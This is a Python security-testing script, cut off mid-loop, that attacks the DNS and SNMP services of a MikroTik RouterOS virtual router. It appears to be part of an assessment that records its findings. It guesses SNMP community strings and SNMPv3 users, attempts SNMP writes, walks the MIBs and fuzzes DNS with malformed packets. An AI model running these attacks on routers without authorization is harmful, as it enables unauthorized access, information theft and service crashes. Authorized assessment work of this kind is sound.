#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — DNS & SNMP Service Attacks
Phase 6, Script 3 of 4
Target: [REDACTED-INTERNAL-IP] (DNS:53, SNMP:161)

Tests (~120):
  DNS (~60, if enabled): open resolver, TXID entropy, AXFR, rebinding,
       tunneling, DNSSEC, amplification, malformed packets
  SNMP (~60): community enumeration, v1/v2c/v3 support, MIB walk,
       enterprise OID walk, write testing, info disclosure, v3 user enum,
       malformed packets, GetBulk amplification

Evidence: evidence/dns_snmp_attacks.json
"""

import os
import random
import socket
import struct
import subprocess
import sys
import time
import warnings

warnings.filterwarnings("ignore")

sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import *

ec = EvidenceCollector("attack_dns_snmp.py", phase=6)


# =============================================================================
# DNS Helpers
# =============================================================================

def build_dns_query(domain, qtype=1, qclass=1, txid=None):
    """Build a raw DNS query packet.
    qtype: 1=A, 2=NS, 5=CNAME, 6=SOA, 12=PTR, 15=MX, 16=TXT, 28=AAAA,
           252=AXFR, 255=ANY
    """
    if txid is None:
        txid = random.randint(0, 65535)

    # Header: ID, flags(standard query, recursion desired), QDCOUNT=1
    header = struct.pack(">HHHHHH", txid, 0x0100, 1, 0, 0, 0)

    # Question section: encode domain name
    question = b""
    for label in domain.split("."):
        question += bytes([len(label)]) + label.encode()
    question += b"\x00"  # root label
    question += struct.pack(">HH", qtype, qclass)

    return header + question, txid


def send_dns_query(data, timeout=3):
    """Send raw DNS query via UDP and return response."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    s.sendto(data, (TARGET, 53))
    try:
        resp, addr = s.recvfrom(65535)
        s.close()
        return resp
    except socket.timeout:
        s.close()
        return None


def parse_dns_header(data):
    """Parse the DNS response header."""
    if len(data) < 12:
        return None
    txid, flags, qdcount, ancount, nscount, arcount = struct.unpack(">HHHHHH", data[:12])
    return {
        "txid": txid,
        "flags": flags,
        "qr": (flags >> 15) & 1,
        "opcode": (flags >> 11) & 0xF,
        "aa": (flags >> 10) & 1,
        "tc": (flags >> 9) & 1,
        "rd": (flags >> 8) & 1,
        "ra": (flags >> 7) & 1,
        "rcode": flags & 0xF,
        "qdcount": qdcount,
        "ancount": ancount,
        "nscount": nscount,
        "arcount": arcount,
    }


# =============================================================================
# SNMP Helpers
# =============================================================================

def build_snmp_get(community, oid_str, version=1):
    """Build a minimal SNMPv1/v2c GET request packet."""
    # This is a simplified ASN.1/BER encoder for SNMP GET
    # version: 0=v1, 1=v2c

    def encode_length(length):
        if length < 0x80:
            return bytes([length])
        elif length < 0x100:
            return b"\x81" + bytes([length])
        else:
            return b"\x82" + struct.pack(">H", length)

    def encode_oid(oid_str):
        parts = [int(x) for x in oid_str.split(".") if x]
        if len(parts) < 2:
            parts = [1, 3, 6, 1, 2, 1, 1, 1, 0]

        # First two components encoded as 40*X + Y
        encoded = bytes([40 * parts[0] + parts[1]])
        for p in parts[2:]:
            if p < 128:
                encoded += bytes([p])
            elif p < 16384:
                encoded += bytes([0x80 | (p >> 7), p & 0x7F])
            else:
                # Multi-byte encoding
                result = []
                while p > 0:
                    result.append(p & 0x7F)
                    p >>= 7
                result.reverse()
                for i in range(len(result) - 1):
                    result[i] |= 0x80
                encoded += bytes(result)
        return b"\x06" + encode_length(len(encoded)) + encoded

    # Integer encoding
    def encode_int(val):
        if val == 0:
            return b"\x02\x01\x00"
        b_val = val.to_bytes((val.bit_length() + 8) // 8, byteorder='big', signed=True)
        return b"\x02" + encode_length(len(b_val)) + b_val

    # Build OID
    oid_encoded = encode_oid(oid_str)

    # VarBind: SEQUENCE { OID, NULL }
    null_val = b"\x05\x00"
    varbind = oid_encoded + null_val
    varbind_seq = b"\x30" + encode_length(len(varbind)) + varbind

    # VarBindList: SEQUENCE { varbind }
    varbind_list = b"\x30" + encode_length(len(varbind_seq)) + varbind_seq

    # Request ID
    request_id = encode_int(random.randint(1, 2147483647))

    # Error status and index
    error_status = b"\x02\x01\x00"
    error_index = b"\x02\x01\x00"

    # PDU: GET-REQUEST (0xA0)
    pdu_data = request_id + error_status + error_index + varbind_list
    pdu = b"\xa0" + encode_length(len(pdu_data)) + pdu_data

    # Version
    version_encoded = encode_int(version)

    # Community string
    comm_bytes = community.encode()
    community_encoded = b"\x04" + encode_length(len(comm_bytes)) + comm_bytes

    # SNMP Message: SEQUENCE { version, community, pdu }
    message_data = version_encoded + community_encoded + pdu
    message = b"\x30" + encode_length(len(message_data)) + message_data

    return message


def build_snmp_getbulk(community, oid_str, max_repetitions=50):
    """Build an SNMPv2c GetBulk request for amplification testing."""

    def encode_length(length):
        if length < 0x80:
            return bytes([length])
        elif length < 0x100:
            return b"\x81" + bytes([length])
        else:
            return b"\x82" + struct.pack(">H", length)

    def encode_oid(oid_str):
        parts = [int(x) for x in oid_str.split(".") if x]
        if len(parts) < 2:
            parts = [1, 3, 6, 1, 2, 1, 1, 1, 0]
        encoded = bytes([40 * parts[0] + parts[1]])
        for p in parts[2:]:
            if p < 128:
                encoded += bytes([p])
            elif p < 16384:
                encoded += bytes([0x80 | (p >> 7), p & 0x7F])
            else:
                result = []
                while p > 0:
                    result.append(p & 0x7F)
                    p >>= 7
                result.reverse()
                for i in range(len(result) - 1):
                    result[i] |= 0x80
                encoded += bytes(result)
        return b"\x06" + encode_length(len(encoded)) + encoded

    def encode_int(val):
        if val == 0:
            return b"\x02\x01\x00"
        b_val = val.to_bytes((val.bit_length() + 8) // 8, byteorder='big', signed=True)
        return b"\x02" + encode_length(len(b_val)) + b_val

    oid_encoded = encode_oid(oid_str)
    null_val = b"\x05\x00"
    varbind = oid_encoded + null_val
    varbind_seq = b"\x30" + encode_length(len(varbind)) + varbind
    varbind_list = b"\x30" + encode_length(len(varbind_seq)) + varbind_seq

    request_id = encode_int(random.randint(1, 2147483647))
    non_repeaters = b"\x02\x01\x00"
    max_reps = encode_int(max_repetitions)

    # PDU: GETBULK-REQUEST (0xA5)
    pdu_data = request_id + non_repeaters + max_reps + varbind_list
    pdu = b"\xa5" + encode_length(len(pdu_data)) + pdu_data

    version_encoded = encode_int(1)  # v2c
    comm_bytes = community.encode()
    community_encoded = b"\x04" + encode_length(len(comm_bytes)) + comm_bytes

    message_data = version_encoded + community_encoded + pdu
    message = b"\x30" + encode_length(len(message_data)) + message_data
    return message


def send_snmp_raw(data, timeout=3):
    """Send raw SNMP packet via UDP."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    s.sendto(data, (TARGET, 161))
    try:
        resp, addr = s.recvfrom(65535)
        s.close()
        return resp
    except socket.timeout:
        s.close()
        return None


# =============================================================================
# DNS Tests (~60)
# =============================================================================

def dns_tests():
    log("=" * 60)
    log("Section 1: DNS Attacks (port 53)")
    log("=" * 60)

    # ── Check if DNS is enabled ──────────────────────────────────────────
    dns_enabled = False
    try:
        query, txid = build_dns_query("localhost", qtype=1)
        resp = send_dns_query(query, timeout=3)
        if resp is not None:
            dns_enabled = True
            header = parse_dns_header(resp)
            ec.add_test("dns", "DNS service check",
                        "Test if DNS resolver/server is active on port 53",
                        f"DNS is ACTIVE (got response, rcode={header.get('rcode') if header else 'N/A'})",
                        {"enabled": True, "response_size": len(resp),
                         "header": header})
        else:
            ec.add_test("dns", "DNS service check",
                        "Test if DNS resolver/server is active on port 53",
                        "DNS not responding on UDP 53 (disabled or filtered)")
    except Exception as e:
        ec.add_test("dns", "DNS service check",
                    "DNS service detection", f"Error: {e}")

    # Also check via REST API
    try:
        status, data = rest_get("/ip/dns")
        if status == 200:
            ec.add_test("dns", "DNS configuration (REST)",
                        "Query DNS configuration via REST API",
                        f"DNS config: {data}",
                        {"config": data})
            # Check if allow-remote-requests is enabled
            if isinstance(data, dict) and data.get("allow-remote-requests") == "true":
                dns_enabled = True
                ec.add_test("dns", "DNS remote requests enabled",
                            "Check allow-remote-requests setting",
                            "allow-remote-requests = true (DNS resolver open to network)",
                            anomaly=True)
    except Exception as e:
        ec.add_test("dns", "DNS config check", "REST DNS config", f"Error: {e}")

    if not dns_enabled:
        ec.add_test("dns", "DNS tests skipped",
                    "DNS service not enabled — skipping DNS attack tests",
                    "SKIPPED: DNS not active on target",
                    {"reason": "DNS service not responding and/or not enabled"})
        return

    # ── Test 1: Open resolver test ───────────────────────────────────────
    log("  Testing DNS open resolver...")
    external_domains = ["google.com", "example.com", "cloudflare.com"]
    resolver_open = False

    for domain in external_domains:
        try:
            query, txid = build_dns_query(domain, qtype=1)
            resp = send_dns_query(query, timeout=3)
            if resp:
                header = parse_dns_header(resp)
                is_answer = header and header.get("ancount", 0) > 0

                ec.add_test("dns", f"Open resolver: {domain}",
                            f"Query external domain '{domain}' to test open resolver",
                            f"Response: {len(resp)} bytes, answers={header.get('ancount') if header else 'N/A'}",
                            {"domain": domain, "response_size": len(resp),
                             "header": header, "has_answer": is_answer})
                if is_answer:
                    resolver_open = True
            else:
                ec.add_test("dns", f"Open resolver: {domain}",
                            f"Query external domain '{domain}'",
                            "No response (timeout)")
        except Exception as e:
            ec.add_test("dns", f"Open resolver: {domain}",
                        f"Open resolver test", f"Error: {e}")

    if resolver_open:
        ec.add_finding("MEDIUM", "DNS open resolver",
                       "MikroTik DNS is configured as an open resolver, "
                       "allowing external queries. Can be abused for DNS amplification attacks.",
                       cwe="CWE-406")

    # ── Test 2: TXID entropy analysis (50 queries) ───────────────────────
    log("  Analyzing DNS TXID entropy (50 queries)...")
    txids_received = []
    for i in range(50):
        try:
            query, sent_txid = build_dns_query("localhost", qtype=1)
            resp = send_dns_query(query, timeout=2)
            if resp:
                header = parse_dns_header(resp)
                if header:
                    txids_received.append(header["txid"])
        except:
            pass

    if txids_received:
        unique_txids = len(set(txids_received))
        min_txid = min(txids_received)
        max_txid = max(txids_received)
        spread = max_txid - min_txid

        # Simple entropy estimate
        sequential = 0
        for i in range(1, len(txids_received)):
            if abs(txids_received[i] - txids_received[i-1]) <= 1:
                sequential += 1

        ec.add_test("dns", "TXID entropy analysis",
                    "Analyze randomness of DNS transaction IDs (50 queries)",
                    f"Unique: {unique_txids}/50, spread: {spread}, sequential_pairs: {sequential}",
                    {"total_queries": 50, "responses": len(txids_received),
                     "unique_txids": unique_txids, "min": min_txid, "max": max_txid,
                     "spread": spread, "sequential_pairs": sequential,
                     "sample": txids_received[:20]},
                    anomaly=sequential > 10 or unique_txids < 40)

        if sequential > 10:
            ec.add_finding("MEDIUM", "Weak DNS TXID randomness",
                           f"DNS transaction IDs show sequential patterns "
                           f"({sequential} sequential pairs in 50 queries), "
                           f"enabling cache poisoning attacks",
                           cwe="CWE-330")

    # ── Test 3: AXFR zone transfer attempt ───────────────────────────────
    log("  Testing AXFR zone transfer...")
    try:
        # AXFR uses TCP
        query, txid = build_dns_query(TARGET, qtype=252)  # AXFR
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET, 53))
        # TCP DNS: prepend 2-byte length
        s.send(struct.pack(">H", len(query)) + query)
        time.sleep(1)
        try:
            resp = s.recv(65535)
            ec.add_test("dns", "AXFR zone transfer",
                        "Attempt DNS zone transfer (AXFR)",
                        f"Response: {len(resp)} bytes",
                        {"response_size": len(resp),
                         "response_hex": resp.hex()[:400] if resp else ""},
                        anomaly=len(resp) > 50)
            if len(resp) > 50:
                ec.add_finding("HIGH", "DNS zone transfer allowed",
                               "AXFR zone transfer accepted, exposing all DNS records",
                               cwe="CWE-200")
        except socket.timeout:
            ec.add_test("dns", "AXFR zone transfer",
                        "Attempt DNS zone transfer",
                        "No response (timeout — likely blocked)")
        s.close()
    except Exception as e:
        ec.add_test("dns", "AXFR zone transfer",
                    "AXFR test", f"Error: {e}")

    # ── Test 4: DNS rebinding ────────────────────────────────────────────
    try:
        query, txid = build_dns_query("127.0.0.1.nip.io", qtype=1)
        resp = send_dns_query(query, timeout=3)
        if resp:
            header = parse_dns_header(resp)
            ec.add_test("dns", "DNS rebinding test",
                        "Query domain that resolves to 127.0.0.1",
                        f"Response: {len(resp)} bytes, answers={header.get('ancount') if header else 0}",
                        {"response_size": len(resp), "header": header})
        else:
            ec.add_test("dns", "DNS rebinding test",
                        "DNS rebinding query", "No response")
    except Exception as e:
        ec.add_test("dns", "DNS rebinding test",
                    "DNS rebinding", f"Error: {e}")

    # ── Test 5: DNS tunneling (TXT record with encoded data) ────────────
    try:
        # Query a long subdomain (simulating DNS tunnel)
        tunnel_domain = "AAAA" * 15 + ".example.com"  # 60 char label
        query, txid = build_dns_query(tunnel_domain, qtype=16)  # TXT
        resp = send_dns_query(query, timeout=3)
        ec.add_test("dns", "DNS tunneling probe (TXT)",
                    "Send TXT query with encoded data in subdomain (tunnel simulation)",
                    f"Response: {len(resp) if resp else 0} bytes",
                    {"tunnel_domain": tunnel_domain,
                     "response_size": len(resp) if resp else 0})
    except Exception as e:
        ec.add_test("dns", "DNS tunneling probe",
                    "DNS tunneling test", f"Error: {e}")

    # ── Test 6: DNS amplification (ANY query) ────────────────────────────
    log("  Testing DNS amplification factor...")
    try:
        query, txid = build_dns_query(".", qtype=255)  # ANY for root
        resp = send_dns_query(query, timeout=3)
        if resp:
            amp_factor = len(resp) / len(query)
            ec.add_test("dns", "DNS amplification (ANY .)",
                        "Measure amplification factor with ANY query for root",
                        f"Query: {len(query)}B, Response: {len(resp)}B, Factor: {amp_factor:.1f}x",
                        {"query_size": len(query), "response_size": len(resp),
                         "amplification_factor": round(amp_factor, 2)},
                        anomaly=amp_factor > 5)
            if amp_factor > 10:
                ec.add_finding("MEDIUM", "DNS amplification vector",
                               f"DNS ANY query amplification factor: {amp_factor:.1f}x",
                               cwe="CWE-406")
        else:
            ec.add_test("dns", "DNS amplification (ANY .)",
                        "DNS amplification test", "No response to ANY query")
    except Exception as e:
        ec.add_test("dns", "DNS amplification",
                    "DNS amplification test", f"Error: {e}")

    # Amplification with specific domains
    for domain in ["version.bind", "hostname.bind", "id.server"]:
        try:
            query, txid = build_dns_query(domain, qtype=16, qclass=3)  # TXT CH
            resp = send_dns_query(query, timeout=3)
            if resp:
                ec.add_test("dns", f"DNS CH query: {domain}",
                            f"Query CHAOS class TXT for '{domain}' (info disclosure)",
                            f"Response: {len(resp)} bytes",
                            {"domain": domain, "response_size": len(resp),
                             "response_hex": resp.hex()[:200]},
                            anomaly=True)
            else:
                ec.add_test("dns", f"DNS CH query: {domain}",
                            f"CHAOS TXT query for {domain}", "No response")
        except Exception as e:
            ec.add_test("dns", f"DNS CH query: {domain}",
                        f"CHAOS query test", f"Error: {e}")

    check_router_alive()

    # ── Test 7-12: Malformed DNS packets ─────────────────────────────────
    log("  Testing malformed DNS packets...")
    malformed_packets = [
        ("Truncated header (4B)", b"\x00\x01\x00\x00"),
        ("Zero-length packet", b""),
        ("All zeros (12B)", b"\x00" * 12),
        ("All 0xFF (12B)", b"\xff" * 12),
        ("Invalid opcode (15)", struct.pack(">HHHHHH", 0x1234, 0x7800, 1, 0, 0, 0)),
        ("QDCOUNT=65535", struct.pack(">HHHHHH", 0x1234, 0x0100, 0xFFFF, 0, 0, 0)),
        ("ANCOUNT=65535", struct.pack(">HHHHHH", 0x1234, 0x0100, 0, 0xFFFF, 0, 0)),
        ("Label length 63 (max)", b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
         b"\x3f" + b"A" * 63 + b"\x00\x00\x01\x00\x01"),
        ("Label length 64 (over)", b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
         b"\x40" + b"A" * 64 + b"\x00\x00\x01\x00\x01"),
        ("Compression pointer loop", b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
         b"\xc0\x0c" + b"\x00\x01\x00\x01"),
        ("Random garbage (64B)", os.urandom(64)),
        ("Random garbage (512B)", os.urandom(512)),
        ("Oversized query (4KB)", os.urandom(4096)),
        ("NUL in domain", b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
         b"\x04test\x00\x07example\x03com\x00\x00\x01\x00\x01"),
    ]

    fuzz_count = 0
    for name, packet in malformed_packets:
        try:
            resp = send_dns_query(packet, timeout=2)
            ec.add_test("dns", f"Malformed DNS: {name}",
                        f"Send malformed DNS packet: {name}",
                        f"Response: {len(resp) if resp else 0} bytes",
                        {"packet_size": len(packet), "packet_hex": packet.hex()[:200],
                         "response_size": len(resp) if resp else 0,
                         "response_hex": resp.hex()[:200] if resp else ""})
        except Exception as e:
            ec.add_test("dns", f"Malformed DNS: {name}",
                        f"Malformed DNS test", f"Error: {e}")

        fuzz_count += 1
        if fuzz_count % 10 == 0:
            h = check_router_alive()
            if not h.get("alive"):
                ec.add_finding("CRITICAL", "DNS crash on malformed input",
                               f"Router crashed after malformed DNS packet: {name}",
                               cwe="CWE-20")
                wait_for_router()

    # ── Test 13-16: DNS record type enumeration ──────────────────────────
    log("  Enumerating DNS record types...")
    record_types = {
        1: "A", 2: "NS", 5: "CNAME", 6: "SOA", 12: "PTR", 15: "MX",
        16: "TXT", 28: "AAAA", 33: "SRV", 35: "NAPTR", 43: "DS",
        46: "RRSIG", 47: "NSEC", 48: "DNSKEY", 255: "ANY"
    }

    for qtype, name in record_types.items():
        try:
            query, txid = build_dns_query("localhost", qtype=qtype)
            resp = send_dns_query(query, timeout=2)
            if resp:
                header = parse_dns_header(resp)
                ec.add_test("dns", f"DNS record type: {name} ({qtype})",
                            f"Query record type {name} for localhost",
                            f"rcode={header.get('rcode') if header else 'N/A'}, "
                            f"answers={header.get('ancount') if header else 0}",
                            {"qtype": qtype, "name": name,
                             "header": header})
            else:
                ec.add_test("dns", f"DNS record type: {name} ({qtype})",
                            f"Query type {name}", "No response")
        except Exception as e:
            ec.add_test("dns", f"DNS record type: {name}",
                        f"Record type test", f"Error: {e}")

    # ── Test 17: DNS TCP support ─────────────────────────────────────────
    try:
        query, txid = build_dns_query("localhost", qtype=1)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET, 53))
        s.send(struct.pack(">H", len(query)) + query)
        time.sleep(0.5)
        resp = s.recv(65535)
        ec.add_test("dns", "DNS over TCP",
                    "Test if DNS accepts TCP queries (port 53)",
                    f"TCP DNS response: {len(resp)} bytes",
                    {"response_size": len(resp)})
        s.close()
    except Exception as e:
        ec.add_test("dns", "DNS over TCP",
                    "DNS TCP support test", f"Error: {e}")

    check_router_alive()


# =============================================================================
# SNMP Tests (~60)
# =============================================================================

def snmp_tests():
    log("=" * 60)
    log("Section 2: SNMP Attacks (port 161)")
    log("=" * 60)

    # ── Test 1: SNMP service detection ───────────────────────────────────
    snmp_active = False
    try:
        pkt = build_snmp_get("public", "[REDACTED-IP].[REDACTED-IP].0")
        resp = send_snmp_raw(pkt, timeout=3)
        if resp:
            snmp_active = True
            ec.add_test("snmp", "SNMP service detection",
                        "Detect SNMP service on UDP 161",
                        f"SNMP active (response: {len(resp)} bytes)",
                        {"response_size": len(resp), "response_hex": resp.hex()[:200]})
        else:
            ec.add_test("snmp", "SNMP service detection",
                        "Detect SNMP service",
                        "No SNMP response (may be disabled or filtered)")
    except Exception as e:
        ec.add_test("snmp", "SNMP service detection",
                    "SNMP detection", f"Error: {e}")

    # Also check via REST API
    try:
        status, data = rest_get("/snmp")
        if status == 200:
            ec.add_test("snmp", "SNMP configuration (REST)",
                        "Query SNMP configuration via REST API",
                        f"SNMP config: {data}",
                        {"config": data})
            if isinstance(data, dict) and data.get("enabled") == "true":
                snmp_active = True
    except:
        pass

    if not snmp_active:
        # Try harder with snmpget command
        try:
            r = subprocess.run(
                ["snmpget", "-v2c", "-c", "public", "-t", "3", "-r", "0",
                 TARGET, "[REDACTED-IP].[REDACTED-IP].0"],
                capture_output=True, text=True, timeout=10)
            if r.returncode == 0 and "Timeout" not in r.stderr:
                snmp_active = True
                ec.add_test("snmp", "SNMP via snmpget",
                            "Verify SNMP with snmpget command",
                            f"Response: {r.stdout.strip()[:200]}",
                            {"output": r.stdout.strip()})
        except:
            pass

    if not snmp_active:
        ec.add_test("snmp", "SNMP tests — limited scope",
                    "SNMP not confirmed active — will still attempt community enumeration",
                    "SNMP may be disabled; testing anyway")

    # ── Test 2-11: Community string enumeration ──────────────────────────
    log("  Enumerating SNMP community strings...")
    communities_to_test = [
        "public", "private", "mikrotik", "admin", "router",
        "community", "test", "snmp", "default", "monitor",
        "write", "secret", "management", "system", "network",
    ]

    valid_communities = []
    for comm in communities_to_test:
        try:
            r = subprocess.run(
                ["snmpget", "-v2c", "-c", comm, "-t", "2", "-r", "0",
                 TARGET, "[REDACTED-IP].[REDACTED-IP].0"],
                capture_output=True, text=True, timeout=8)

            if r.returncode == 0 and "Timeout" not in r.stderr and r.stdout.strip():
                valid_communities.append(comm)
                ec.add_test("snmp", f"Community: '{comm}'",
                            f"Test SNMP community string '{comm}'",
                            f"ACCEPTED: {r.stdout.strip()[:200]}",
                            {"community": comm, "response": r.stdout.strip()[:300]},
                            anomaly=comm not in ("public",))
            else:
                ec.add_test("snmp", f"Community: '{comm}'",
                            f"Test SNMP community string '{comm}'",
                            "Rejected or no response",
                            {"community": comm})
        except Exception as e:
            ec.add_test("snmp", f"Community: '{comm}'",
                        f"Community string test", f"Error: {e}")

    if len(valid_communities) > 1:
        ec.add_finding("MEDIUM", "Multiple SNMP communities accepted",
                       f"SNMP accepts {len(valid_communities)} community strings: "
                       f"{', '.join(valid_communities)}",
                       cwe="CWE-287")

    if "private" in valid_communities:
        ec.add_finding("HIGH", "SNMP 'private' community accepted",
                       "Default 'private' community string (often has write access) is active",
                       cwe="CWE-798")

    # ── Test 12-14: SNMP version support (v1, v2c, v3) ──────────────────
    log("  Testing SNMP version support...")
    for version_name, version_flag in [("v1", "1"), ("v2c", "2c")]:
        try:
            r = subprocess.run(
                ["snmpget", f"-v{version_flag}", "-c", "public", "-t", "2", "-r", "0",
                 TARGET, "[REDACTED-IP].[REDACTED-IP].0"],
                capture_output=True, text=True, timeout=8)

            if r.returncode == 0 and "Timeout" not in r.stderr and r.stdout.strip():
                ec.add_test("snmp", f"SNMP {version_name} support",
                            f"Test SNMP {version_name} protocol support",
                            f"Supported: {r.stdout.strip()[:200]}",
                            {"version": version_name, "response": r.stdout.strip()[:300]},
                            anomaly=version_name == "v1")
                if version_name == "v1":
                    ec.add_finding("LOW", "SNMPv1 enabled",
                                   "SNMPv1 is active — no encryption, community strings in cleartext",
                                   cwe="CWE-319")
            else:
                ec.add_test("snmp", f"SNMP {version_name} support",
                            f"Test SNMP {version_name}",
                            "Not supported or no response")
        except Exception as e:
            ec.add_test("snmp", f"SNMP {version_name} support",
                        f"SNMP version test", f"Error: {e}")

    # SNMPv3
    try:
        r = subprocess.run(
            ["snmpget", "-v3", "-l", "noAuthNoPriv", "-u", "admin",
             "-t", "2", "-r", "0", TARGET, "[REDACTED-IP].[REDACTED-IP].0"],
            capture_output=True, text=True, timeout=8)

        snmpv3_supported = "Timeout" not in r.stderr and "Unknown" not in r.stderr
        ec.add_test("snmp", "SNMPv3 support",
                    "Test SNMPv3 noAuthNoPriv with user 'admin'",
                    f"{'Supported' if snmpv3_supported else 'Not available'}: "
                    f"{(r.stdout + r.stderr).strip()[:200]}",
                    {"version": "v3", "output": (r.stdout + r.stderr).strip()[:300]})
    except Exception as e:
        ec.add_test("snmp", "SNMPv3 support",
                    "SNMPv3 test", f"Error: {e}")

    check_router_alive()

    # ── Test 15-20: Full MIB walk (OID 1.3) ─────────────────────────────
    log("  Performing full MIB walk (OID 1.3)...")
    try:
        r = subprocess.run(
            ["snmpwalk", "-v2c", "-c", "public", "-t", "5", "-r", "1",
             TARGET, "1.3"],
            capture_output=True, text=True, timeout=120)

        lines = [l for l in r.stdout.strip().split("\n") if l]
        ec.add_test("snmp", "Full MIB walk (1.3)",
                    "Walk entire SNMP MIB tree from 1.3",
                    f"Retrieved {len(lines)} OIDs",
                    {"oid_count": len(lines), "sample": lines[:50]},
                    anomaly=len(lines) > 100)

        if len(lines) > 100:
            ec.add_finding("MEDIUM", "SNMP extensive information disclosure",
                           f"Full MIB walk returned {len(lines)} OIDs, exposing "
                           f"detailed system, interface, and routing information",
                           cwe="CWE-200")
    except subprocess.TimeoutExpired:
        ec.add_test("snmp", "Full MIB walk (1.3)",
                    "Full MIB walk", "Timeout after 120s (very large MIB tree)",
                    anomaly=True)
    except Exception as e:
        ec.add_test("snmp", "Full MIB walk",
                    "MIB walk", f"Error: {e}")

    # ── Test 21-25: MikroTik enterprise MIB ([REDACTED-IP].4.1.14988) ─────────
    log("  Walking MikroTik enterprise MIB...")
    try:
        r = subprocess.run(
            ["snmpwalk", "-v2c", "-c", "public", "-t", "5", "-r", "1",
             TARGET, "[REDACTED-IP].4.1.14988"],
            capture_output=True, text=True, timeout=60)

        lines = [l for l in r.stdout.strip().split("\n") if l]
        ec.add_test("snmp", "MikroTik enterprise MIB walk",
                    "Walk MikroTik-specific enterprise OIDs ([REDACTED-IP].4.1.14988)",
                    f"Retrieved {len(lines)} MikroTik OIDs",
                    {"oid_count": len(lines), "oids": lines[:50]},
                    anomaly=len(lines) > 0)
    except subprocess.TimeoutExpired:
        ec.add_test("snmp", "MikroTik enterprise MIB",
                    "Enterprise MIB walk", "Timeout")
    except Exception as e:
        ec.add_test("snmp", "MikroTik enterprise MIB",
                    "Enterprise walk", f"Error: {e}")

    # ── Test 26-30: SNMP info disclosure (specific OIDs) ─────────────────
    log("  Extracting specific SNMP information...")
    info_oids = {
        "sysDescr": "[REDACTED-IP].[REDACTED-IP].0",
        "sysObjectID": "[REDACTED-IP].[REDACTED-IP].0",
        "sysUpTime": "[REDACTED-IP].[REDACTED-IP].0",
        "sysContact": "[REDACTED-IP].[REDACTED-IP].0",
        "sysName": "[REDACTED-IP].[REDACTED-IP].0",
        "sysLocation": "[REDACTED-IP].[REDACTED-IP].0",
        "sysServices": "[REDACTED-IP].[REDACTED-IP].0",
    }

    disclosed_info = {}
    for name, oid in info_oids.items():
        try:
            r = subprocess.run(
                ["snmpget", "-v2c", "-c", "public", "-t", "2", "-r", "0",
                 TARGET, oid],
                capture_output=True, text=True, timeout=8)

            value = r.stdout.strip()
            if r.returncode == 0 and value:
                disclosed_info[name] = value
                ec.add_test("snmp", f"SNMP {name}",
                            f"Query {name} ({oid})",
                            f"Value: {value[:200]}",
                            {"oid": oid, "name": name, "value": value})
            else:
                ec.add_test("snmp", f"SNMP {name}",
                            f"Query {name}", "No data")
        except Exception as e:
            ec.add_test("snmp", f"SNMP {name}",
                        f"Info disclosure test", f"Error: {e}")

    # ── Test 31-35: Interface, route, ARP table enumeration ──────────────
    log("  Enumerating interfaces, routes, ARP via SNMP...")
    walk_trees = {
        "interfaces": "[REDACTED-IP].2.1.2",
        "ip_addresses": "[REDACTED-IP].[REDACTED-IP]",
        "ip_routes": "[REDACTED-IP].[REDACTED-IP]",
        "arp_table": "[REDACTED-IP].[REDACTED-IP]",
        "mac_addresses": "[REDACTED-IP].[REDACTED-IP].1.6",
    }

    for name, oid in walk_trees.items():
        try:
            r = subprocess.run(
                ["snmpwalk", "-v2c", "-c", "public", "-t", "3", "-r", "1",
                 TARGET, oid],
                capture_output=True, text=True, timeout=30)

            lines = [l for l in r.stdout.strip().split("\n") if l]
            ec.add_test("snmp", f"SNMP walk: {name}",
                        f"Walk SNMP subtree for {name} ({oid})",
                        f"Retrieved {len(lines)} entries",
                        {"oid_tree": oid, "name": name,
                         "entry_count": len(lines), "sample": lines[:20]},
                        anomaly=len(lines) > 0)
        except Exception as e:
            ec.add_test("snmp", f"SNMP walk: {name}",
                        f"SNMP walk test", f"Error: {e}")

    check_router_alive()

    # ── Test 36-40: SNMP write testing ───────────────────────────────────
    log("  Testing SNMP write access...")
    # Try SET on sysContact and sysLocation (commonly writable)
    write_oids = {
        "sysContact": ("[REDACTED-IP].[REDACTED-IP].0", "s", "SNMP_WRITE_TEST"),
        "sysLocation": ("[REDACTED-IP].[REDACTED-IP].0", "s", "SNMP_WRITE_TEST_LOC"),
        "sysName": ("[REDACTED-IP].[REDACTED-IP].0", "s", "SNMP_WRITE_TEST_NAME"),
    }

    for comm in ["public", "private"]:
        for name, (oid, oid_type, value) in write_oids.items():
            try:
                r = subprocess.run(
                    ["snmpset", "-v2c", "-c", comm, "-t", "2", "-r", "0",
                     TARGET, oid, oid_type, value],
                    capture_output=True, text=True, timeout=8)

                write_success = r.returncode == 0 and "Error" not in r.stderr
                ec.add_test("snmp", f"SNMP SET {name} (comm={comm})",
                            f"Attempt SNMP SET on {name} with community '{comm}'",
                            f"{'WRITE SUCCEEDED!' if write_success else 'Write rejected'}: "
                            f"{(r.stdout + r.stderr).strip()[:200]}",
                            {"oid": oid, "community": comm, "value": value,
                             "write_success": write_success},
                            anomaly=write_success)

                if write_success:
                    ec.add_finding("HIGH", f"SNMP write access via '{comm}' community",
                                   f"SNMP SET succeeded on {name} with community '{comm}'",
                                   cwe="CWE-732")
            except Exception as e:
                ec.add_test("snmp", f"SNMP SET {name} (comm={comm})",
                            f"SNMP write test", f"Error: {e}")

    # ── Test 41-44: SNMPv3 user enumeration ──────────────────────────────
    log("  Testing SNMPv3 user enumeration...")
    v3_users = ["admin", "root", "snmp", "monitor", "mikrotik",
                "routeros", "public", "manager", "operator"]

    for user in v3_users:
        try:
            r = subprocess.run(
                ["snmpget", "-v3", "-l", "noAuthNoPriv", "-u", user,
                 "-t", "2", "-r", "0", TARGET, "[REDACTED-IP].[REDACTED-IP].0"],
                capture_output=True, text=True, timeout=8)

            output = (r.stdout + r.stderr).strip()
            # "Unknown user name" vs other errors can indicate valid/invalid
